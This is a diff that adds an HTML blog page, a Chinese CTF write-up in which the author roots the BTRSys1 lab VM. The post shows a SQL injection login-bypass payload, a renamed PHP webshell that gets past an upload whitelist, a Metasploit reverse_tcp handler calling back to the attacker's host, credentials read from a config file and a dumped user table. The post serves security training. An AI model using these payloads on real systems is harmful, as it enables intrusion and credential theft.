@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>CTF-BTRsys1_WriteUp，通过Sql注入绕过登陆界面获取shell拿Root | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CTF-BTRsys1_WriteUp，通过Sql注入绕过登陆界面获取shell拿Root</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 28, 2019&nbsp;&nbsp;11:21:07</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=504686387&auto=1&height=66"></iframe>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/875.png" alt="图片"></p>
+<p>HackGame：<code>BTRSys1</code><br>靶场<code>IP</code>：<code>10.10.10.137</code><br>任务：拿到<code>root</code>用户</p>
+<h2 id="学习到的知识"><a href="#学习到的知识" class="headerlink" title="学习到的知识"></a>学习到的知识</h2><p>通过<code>Sql</code>注入（类似于万能密码）绕过登陆<br>通过白名单验证图片上传限制</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机<code>IP</code>后首先<code>NMAP</code>扫扫端口开放服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 10.10.10.137</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/858.png" alt="图片"></p>
+<p>它是开放了<code>21</code>(ftp)、<code>22</code>(ssh)、<code>80</code>(http)三个端口，其中<code>ftp</code>运行<code>匿名用户</code>登陆，我们首先使用匿名用户登陆一下<code>ftp</code>看看,这把使用的是<code>Windows</code>下自带的<code>ftp</code>协议，直接在文件夹里输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp://10.10.10.137</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/859.png" alt="图片"></p>
+<p>登陆进去发现没有任何文件，那么<code>ftp</code>无果后我来到了<code>80</code>端口看看能不能从<code>web</code>来突破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.137</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/860.png" alt="图片"></p>
+<p>从页面上我没有找到可利用的地方，我遍开始对它进行爆破枚举网站目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.137</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://10.10.10.137/ ----</span><br><span class="line">+ http://10.10.10.137/login.php (CODE:200|SIZE:4561)                                                                                                                     </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.137/assets/                                                                                                                               </span><br><span class="line">+ http://10.10.10.137/index.php (CODE:200|SIZE:758)                                                                                                                      </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.137/javascript/                                                                                                                           </span><br><span class="line">+ http://10.10.10.137/server-status (CODE:403|SIZE:292)                                                                                                                  </span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.137/uploads/  </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/861.png" alt="图片"></p>
+<p>其中<code>login.php</code>引起了我的注意：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.137/login.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/862.png" alt="图片"></p>
+<p>它很显然是一个登陆的页面，尝试了<code>弱口令</code>无结果，审查元素看了看源代码发现了一段<code>JS</code>:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">control</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> user = <span class="built_in">document</span>.getElementById(<span class="string">&quot;user&quot;</span>).value;</span><br><span class="line">    <span class="keyword">var</span> pwd = <span class="built_in">document</span>.getElementById(<span class="string">&quot;pwd&quot;</span>).value;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> str=user.substring(user.lastIndexOf(<span class="string">&quot;@&quot;</span>)+<span class="number">1</span>,user.length);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>((pwd == <span class="string">&quot;&#x27;&quot;</span>))&#123;</span><br><span class="line">		alert(<span class="string">&quot;Hack Denemesi !!!&quot;</span>);</span><br><span class="line">		</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (str!=<span class="string">&quot;btrisk.com&quot;</span>)&#123;</span><br><span class="line">		alert(<span class="string">&quot;Yanlis Kullanici Bilgisi Denemektesiniz&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		</span><br><span class="line">      <span class="built_in">document</span>.loginform.submit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/863.png" alt="图片"></p>
+<p>这段<code>JavaScript</code>代码对它的用户名进行判断，用户名必须要为<code>@btrisk.com</code>结尾，那么尝试一下注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /personel.php HTTP/1.1</span><br><span class="line">Host: 10.10.10.137</span><br><span class="line">Content-Length: 53</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://10.10.10.137</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">X-Forwarded-For: 192.168.1.1</span><br><span class="line">Referer: http://10.10.10.137/login.php</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">kullanici_adi=hacker@btrisk.com&amp;parola=111&#x27;or 1=1 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/864.png" alt="图片"></p>
+<p>通过注入登陆进了后台发现了一个上传点，通过尝试上传脚本文件<code>PHP</code>发现不允许上传，只允许上传<code>JPG</code>和<code>PNG</code>格式的文件（白名单验证）</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/865.png" alt="图片"></p>
+<p>那么我们就先把<code>PHP</code>脚本木马修改为<code>jpg</code>格式，然后抓包拦截吧后缀修改为<code>PHP</code>成功突破<code>白名单验证</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/866.png" alt="图片"></p>
+<p>通过<code>MSF</code>监听回来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set lhost 10.10.10.134</span><br><span class="line">set lport 8888</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/867.png" alt="图片"></p>
+<p>因为刚刚扫描<code>WEB</code>目录的时候有一个<code>upload</code>目录，那个目录就是上传的路径：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/868.png" alt="图片"></p>
+<p>访问脚本木马反弹<code>shell</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.137/uploads/2.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/869.png" alt="图片"></p>
+<p>查看权限发现是一个网站普通权限，而且不是一个<code>bash</code>的shell，我们通过<code>Python</code>让它变成<code>bash</code>的shell：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/870.png" alt="图片"></p>
+<p>通过在网站根目录<code>/vat/www/html</code>下发现了一个配置文件<code>config.php</code>:</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/871.png" alt="图片"></p>
+<p>里面是<code>mysql</code>的连接账号密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user : root</span><br><span class="line">pass : toor</span><br><span class="line">database : deneme</span><br></pre></td></tr></table></figure>
+
+<p>它只允许本地连接到<code>mysql</code>，那么我们就通过得到的账号密码连接到它的<code>mysql</code>数据库里：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line">pass : toor</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/872.png" alt="图片"></p>
+<p>通过查看<code>deneme</code>数据库下的<code>user</code>表发现了账号密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| deneme             |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use deneme;</span><br><span class="line">use deneme;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+------------------+</span><br><span class="line">| Tables_in_deneme |</span><br><span class="line">+------------------+</span><br><span class="line">| user             |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user;</span><br><span class="line">select * from user;</span><br><span class="line">+----+-------------+------------------+-----------+---------+-------------+---------+-------------+--------------+</span><br><span class="line">| ID | Ad_Soyad    | Kullanici_Adi    | Parola    | BabaAdi | BabaMeslegi | AnneAdi | AnneMeslegi | KardesSayisi |</span><br><span class="line">+----+-------------+------------------+-----------+---------+-------------+---------+-------------+--------------+</span><br><span class="line">|  1 | ismail kaya | ikaya@btrisk.com | asd123*** | ahmet   | muhasebe    | nazli   | lokantaci   |            5 |</span><br><span class="line">|  2 | can demir   | cdmir@btrisk.com | asd123*** | mahmut  | memur       | gulsah  | tuhafiyeci  |            8 |</span><br><span class="line">+----+-------------+------------------+-----------+---------+-------------+---------+-------------+--------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/873.png" alt="图片"></p>
+<p>最终得到的密码成功切换到<code>root</code>用户：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/874.png" alt="图片"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>首先是通过扫描目录来到了一个登陆页面，通过<code>Sql</code>注入进入到了上传页面，通过白名单绕过得到了一枚<code>shell</code>。最后通过在数据库配置文件中找到了<code>mysql</code>的连接信息拿到账号密码，最终拿到<code>root</code>用户!</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/12/28/CTF-BTRsys1/">http://example.com/2019/12/28/CTF-BTRsys1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/"># SQL注入</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/12/29/ATTCK-Red-Teaming-1/">ATT&CK-RedTeaming-实战入侵演练，横向渗透拿到Flag</a>
+            
+            
+            <a class="next" rel="next" href="/2019/12/27/CTF-Vtcsec/">CTF-Vtcsec_WriteUp，ProFTPD软件后门未授权访问提权拿到Flag</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
